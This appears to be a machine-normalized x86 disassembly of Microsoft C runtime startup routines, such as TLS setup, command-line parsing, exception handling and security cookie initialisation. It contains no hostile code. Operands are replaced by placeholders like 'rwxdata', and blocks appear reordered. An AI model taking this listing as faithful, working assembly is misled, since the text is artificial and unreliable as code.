mov esi eax
call [ EncodePointer@IAT ]
push 0x4
mov [ rwxdata ] eax
call sub_40ebdd
pop ecx
mov eax esi
pop esi
pop ebp
retn
sub_40a0e1
mov edi edi
push ebp
mov ebp esp
push [ rwxdata ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_40a109
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] rwxdata
sub_40a155
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_410feb
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax rwxdata
jne r-xdata
sub_40a1a5
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_40a1fa
mov edi edi
push esi
call sub_40ad4e
mov esi eax
push esi
call sub_40a085
push esi
call sub_40764b
push esi
call sub_41181e
push esi
call sub_411573
push esi
call sub_411080
push esi
call sub_41106f
add esp 0x18
pop esi
retn
sub_40a22d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_40a24a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_40a26e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ rwxdata ]
test eax eax
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
push 0x16
pop eax
pop ebp
retn
mov [ ecx ] eax
xor eax eax
pop ebp
retn
sub_40a29e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ rwxdata ]
test eax eax
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
push 0x16
pop eax
pop ebp
retn
mov [ ecx ] eax
xor eax eax
pop ebp
retn
sub_40a2ce
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
je r-xdata
call sub_40bfbd
push r--data
push r--data
call sub_40a24a
pop ecx
pop ecx
test eax eax
jne r-xdata
push rwxdata
call sub_40fa10
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_40ad28
call sub_409f9b
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ rwxdata ]
pop ecx
cmp [ rwxdata ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rwxdata
call sub_40fa10
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rwxdata ]
sub_40a365
push 0x20
push r--data
call sub_408380
push 0x8
call sub_40ecce
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rwxdata ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a490
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rwxdata ] eax
mov al [ ebp + 0x10 ]
mov [ rwxdata ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_4083c5
retn
mov [ rwxdata ] 0x1
push 0x8
call sub_40ebdd
pop ecx
push [ ebp + 0x8 ]
call sub_40a1d0
mov [ ebp - 0x20 ] r--data
push [ rwxdata ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rwxdata ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_40ad4e
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_40ad4e
mov [ edi ] eax
call ebx
push [ rwxdata ]
call esi
mov ebx eax
push [ rwxdata ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_40a50d
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_4077b7
sub_40a52e
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_40a554
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_40a52e
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_405894
leave
retn
push 0x3
call sub_411b59
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_411b59
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rwxdata ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rwxdata
push edi
call sub_411af6
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_40c2b0
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rwxdata
push esi
push ebx
mov [ rwxdata ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_4077b7
push esi
call sub_411adb
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_411af6
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_411999
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_411adb
lea eax [ eax * 2 + rwxdata ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_411a0e
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_411999
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_41182d
add esp 0xc
jmp r-xdata
sub_40a703
push 0x3
call sub_411b59
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_40a554
push 0xff
call sub_40a554
pop ecx
pop ecx
push 0x3
call sub_411b59
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rwxdata ] 0x1
jne r-xdata
sub_40a73c
mov eax ecx
push esi
add ecx 0x90
pop esi
cmp eax ecx
jae r-xdata
add eax 0xc
lea esi [ ecx + 0x90 ]
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
retn
sub_40a762
mov edi edi
push ebp
mov ebp esp
push esi
call sub_40aec2
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_40a8ac
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_40a762
pop ecx
pop ecx
pop ebp
retn
sub_40a8cc
mov edi edi
push esi
push edi
xor edi edi
cmp [ rwxdata ] edi
jne r-xdata
mov esi [ rwxdata ]
test esi esi
jne r-xdata
call sub_40bc66
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_411db3
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_40a92b
cmp [ rwxdata ] 0x0
jne r-xdata
push esi
mov esi [ rwxdata ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_40bc66
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_40c060
mov edi eax
pop ecx
pop ecx
mov [ rwxdata ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_40c2b0
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rwxdata ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_40c2b0
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rwxdata ]
call sub_409812
and [ rwxdata ] 0x0
and [ edi ] 0x0
mov [ rwxdata ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_40c060
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rwxdata ]
call sub_409812
and [ rwxdata ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_410b69
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4077b7
int3
add edi 0x4
sub_40aa16
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_411db3
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_411db3
pop ecx
test eax eax
je r-xdata
call sub_411db3
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_40abb0
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rwxdata ] ebx
jne r-xdata
push 0x104
mov esi rwxdata
push esi
push ebx
mov [ rwxdata ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rwxdata ]
mov [ rwxdata ] esi
cmp eax ebx
je r-xdata
call sub_40bc66
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_40aa16
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_40c01b
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_40aa16
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rwxdata ] eax
mov [ rwxdata ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_40ac6b
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_40c01b
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_409812
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_40ad02
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_40ad28
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_40ad80
mov edi edi
push esi
push [ rwxdata ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rwxdata ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rwxdata ]
call [ TlsSetValue@IAT ]
sub_40add1
mov eax [ rwxdata ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rwxdata ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rwxdata ]
call [ DecodePointer@IAT ]
call eax
or [ rwxdata ] 0xffffffff
jmp r-xdata
push eax
call [ TlsFree@IAT ]
or [ rwxdata ] 0xffffffff
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rwxdata
push edi
add esi 0x8
cmp esi rwxdata
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rwxdata
pop edi
push edi
call ebx
push edi
call sub_409812
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rwxdata
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_40ae0e
push 0x8
push r--data
call sub_408380
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rwxdata
push 0xd
call sub_40ecce
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40aeb0
push 0xc
call sub_40ecce
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_40bc84
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40aeb9
call sub_4083c5
retn
mov eax [ rwxdata ]
mov [ esi + 0x6c ] eax
sub_40aec2
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rwxdata ]
mov edi eax
call sub_40ad80
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_40c060
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rwxdata ]
push [ rwxdata ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_409812
pop ecx
xor esi esi
push 0x0
push esi
call sub_40ae0e
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_40af55
push 0x8
push r--data
call sub_408380
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_4083c5
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_409812
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_409812
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_409812
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_409812
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_409812
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_409812
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_409812
pop ecx
push 0xd
call sub_40ecce
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_409812
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b06f
push 0xc
call sub_40ecce
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b07b
push esi
call sub_409812
pop ecx
push edi
call sub_40bd13
pop ecx
cmp edi [ rwxdata ]
je r-xdata
cmp edi rwxdata
je r-xdata
cmp edi rwxdata
je r-xdata
push edi
call sub_409812
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_40bdac
pop ecx
sub_40b084
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0xffffffff
je r-xdata
mov eax [ rwxdata ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rwxdata ]
push [ rwxdata ]
call [ DecodePointer@IAT ]
call eax
push [ ebp + 0x8 ]
call sub_40af55
push esi
push [ rwxdata ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rwxdata ]
push [ rwxdata ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_40b0fe
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rwxdata ] eax
call esi
push r--data
push edi
mov [ rwxdata ] eax
call esi
push r--data
push edi
mov [ rwxdata ] eax
call esi
cmp [ rwxdata ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rwxdata ] eax
je r-xdata
call sub_40add1
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rwxdata ] eax
mov eax [ TlsFree@IAT ]
mov [ rwxdata ] sub_40ad57
mov [ rwxdata ] esi
mov [ rwxdata ] eax
cmp [ rwxdata ] 0x0
je r-xdata
xor eax eax
push [ rwxdata ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
call sub_40a1fa
push [ rwxdata ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rwxdata ]
mov [ rwxdata ] eax
call esi
push [ rwxdata ]
mov [ rwxdata ] eax
call esi
push [ rwxdata ]
mov [ rwxdata ] eax
call esi
mov [ rwxdata ] eax
call sub_40eb3c
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_40add1
mov edi [ DecodePointer@IAT ]
push sub_40af55
push [ rwxdata ]
call edi
call eax
mov [ rwxdata ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rwxdata ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_40c060
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rwxdata ]
push [ rwxdata ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_40ae0e
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_40b2b1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rwxdata ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rwxdata ] eax
jmp r-xdata
mov [ rwxdata ] esi
not esi
mov [ rwxdata ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_40b354
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_40fef2
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_4078ae
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
